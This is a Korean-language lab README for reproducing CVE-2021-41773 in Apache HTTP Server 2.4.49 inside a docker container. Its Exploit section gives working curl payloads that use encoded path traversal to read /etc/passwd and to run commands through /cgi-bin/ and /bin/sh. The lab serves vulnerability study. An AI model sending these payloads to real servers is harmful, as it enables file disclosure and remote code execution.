# 아파치 HTTP 서버 2.4.49에서의 경로 탐색 및 파일 노출 취약점 (CVE-2021-41773)


Apache HTTP Server Project는 UNIX 및 Windows를 포함한 최신 운영 체제를 위한 오픈 소스 HTTP 서버를 개발하고 유지 관리하기 위한 노력입니다.

Apache HTTP Server 2.4.49의 경로 정규화 변경 사항에 결함이 있습니다. 공격자는 경로 순회 공격을 사용하여 URL을 예상 문서 루트 외부의 파일에 매핑할 수 있습니다.

이러한 디렉토리 외부의 파일이 일반적인 기본 구성 "require all denied"에 의해 보호되지 않으면 이러한 요청이 성공할 수 있습니다. 별칭이 있는 이러한 경로에 대해서도 CGI 스크립트를 사용하도록 설정하면 원격 코드가 실행될 수 있습니다.

References:

- https://httpd.apache.org/security/vulnerabilities_24.html
- https://twitter.com/ptswarm/status/1445376079548624899
- https://twitter.com/HackerGautam/status/1445412108863041544
- https://twitter.com/snyff/status/1445565903161102344

## 취약한 환경

다음 명령을 실행하여 취약한 Apache HTTP Server를 시작합니다:

```
docker compose build
docker compose up -d
```

서버가 시작되면 아파치 HTTP 서버의 기본 페이지인 It works!를 http://your-ip:8080에서 확인할 수 있습니다.

## Exploit

취약성을 재현하기 위한 간단한 CURL 명령('/icons/'는 기존 디렉토리여야 함):

```
curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

'/etc/passwd'가 성공적으로 공개되었습니다:

![](1.png)

서버에서 mods cgi 또는 cgid가 활성화된 경우 이 경로 통과 취약성으로 인해 임의 명령이 실행될 수 있습니다:

```
curl -v --data "echo;id" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

![](2.png)
